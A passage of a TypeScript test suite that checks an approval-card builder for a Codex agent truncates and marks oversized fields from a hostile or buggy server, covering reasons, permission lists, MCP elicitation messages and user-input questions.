    const q = build({ reason: 'two\nlines\tand a tab' }, {}, 'echo a\n\techo b').question;
    expect(q.text).toBe(
      "Allow Codex to run: echo a\n\techo b\nCodex's stated reason: two\nlines\tand a tab",
    );
  });
});

describe('what a hostile or buggy server sends is bounded before a card is built (S7)', () => {
  const frame = (method: string, params: Record<string, unknown>) => ({ id: 3, method, params });
  const card = (f: ReturnType<typeof frame>): Question => {
    const spec = buildApprovalCard(f, mint, {});
    if (spec === null) throw new Error('no card');
    return spec.question;
  };
  /** About four megabytes of text: far past any field's bound, far below the frame limit. */
  const huge = 'h'.repeat(4_000_000);
  const textBound = 2000;
  const marker = (hidden: number): string => `[${hidden} characters hidden]`;
  /** The total characters of every string in a card. */
  const weight = (value: unknown): number => {
    if (typeof value === 'string') return value.length;
    if (Array.isArray(value)) return value.reduce((n: number, v) => n + weight(v), 0);
    if (typeof value === 'object' && value !== null) {
      return Object.values(value).reduce((n: number, v) => n + weight(v), 0);
    }
    return 0;
  };

  test('a file change keeps its reason and grant root to 2000 characters each and says how much it cut', () => {
    const q = card(
      frame('item/fileChange/requestApproval', { threadId: THREAD, reason: huge, grantRoot: huge }),
    );
    expect(q.text).toBe(
      `Codex asks to change files: ${'h'.repeat(textBound)} ${marker(huge.length - textBound)} (write access under ${'h'.repeat(textBound)} ${marker(huge.length - textBound)}). Answer it in the terminal.`,
    );
    expect(weight(q)).toBeLessThan(5000);
  });

  test('a field of exactly the bound is not cut, one character more is', () => {
    const at = 'a'.repeat(textBound);
    const over = 'a'.repeat(textBound + 1);
    expect(
      card(frame('item/fileChange/requestApproval', { threadId: THREAD, reason: at })).text,
    ).toBe(`Codex asks to change files: ${at}. Answer it in the terminal.`);
    expect(
      card(frame('item/fileChange/requestApproval', { threadId: THREAD, reason: over })).text,
    ).toBe(`Codex asks to change files: ${at} ${marker(1)}. Answer it in the terminal.`);
  });

  test('permissions: the reason is bounded, the list of names too, each name short', () => {
    const permissions: Record<string, unknown> = {};
    for (let i = 0; i < 100; i++) permissions[`${'n'.repeat(1000)}${i}`] = { enabled: true };
    const q = card(
      frame('item/permissions/requestApproval', { threadId: THREAD, reason: huge, permissions }),
    );
    expect(q.text).toContain(`${'h'.repeat(textBound)} ${marker(huge.length - textBound)}`);
    expect(q.text).toContain('[80 more hidden]');
    expect(weight(q)).toBeLessThan(10_000);
  });

  test('an MCP elicitation: the message and the server name are bounded', () => {
    const q = card(
      frame('mcpServer/elicitation/request', {
        threadId: THREAD,
        serverName: huge,
        message: huge,
      }),
    );
    expect(q.text).toContain(`${'h'.repeat(200)} ${marker(huge.length - 200)}`);
    expect(q.text).toContain(`${'h'.repeat(textBound)} ${marker(huge.length - textBound)}`);
    expect(weight(q)).toBeLessThan(5000);
  });

  test('a user-input request: every field of a step, the options of a step and the steps are bounded, and the cuts are marked', () => {
    const questions = Array.from({ length: 50 }, (_, i) => ({
      id: `q${i}`,
      header: huge,
      question: i === 0 ? huge : `question ${i}`,
      options: Array.from({ length: 50 }, (_, k) => ({ label: huge, description: huge, k })),
    }));
    const q = card(frame('item/tool/requestUserInput', { threadId: THREAD, questions }));
    expect(q.questions).toHaveLength(8);
    // The card's text mirrors the first question, cuts and all.
    expect(q.text).toBe(
      `${'h'.repeat(textBound)} ${marker(huge.length - textBound)} [38 more options hidden]`,
    );
    const first = q.questions?.[0];
    expect(first?.header).toBe(`${'h'.repeat(200)} ${marker(huge.length - 200)}`);
    expect(first?.options).toHaveLength(12);
    expect(first?.options[0]?.label).toBe(`${'h'.repeat(200)} ${marker(huge.length - 200)}`);
    expect(first?.options[0]?.description).toBe(`${'h'.repeat(500)} ${marker(huge.length - 500)}`);
    expect(first?.text).toBe(q.text);
    // The cut steps are said once, on the last kept step.
    expect(q.questions?.[7]?.text.endsWith('[42 more questions hidden]')).toBe(true);
    // Whatever the server sends, the card stays well under a megabyte.
    expect(weight(q)).toBeLessThan(120_000);
  });

  test('an ordinary user-input request is untouched by the bounds', () => {
    const q = card(
      frame('item/tool/requestUserInput', {
        threadId: THREAD,
        questions: [{ id: 'q1', header: 'Pick', question: 'First?', options: [{ label: 'A' }] }],
      }),
    );
    expect(q.questions).toEqual([
      {
        header: 'Pick',
        text: 'First?',
        multiSelect: false,
        options: [{ label: 'A', value: 'A', isRecommended: false, isYes: false, isNo: false }],
      },
    ]);
  });

  test('the command reason stays at 300, and the command itself is the 20000-character card or terminalOnly', () => {
    const spec = build({ reason: huge }, {}, 'echo a');
    expect(spec.question.text).toBe(
      `Allow Codex to run: echo a\nCodex's stated reason: ${'h'.repeat(300)}...`,
    );
    expect(weight(spec.question)).toBeLessThan(500);
  });
});
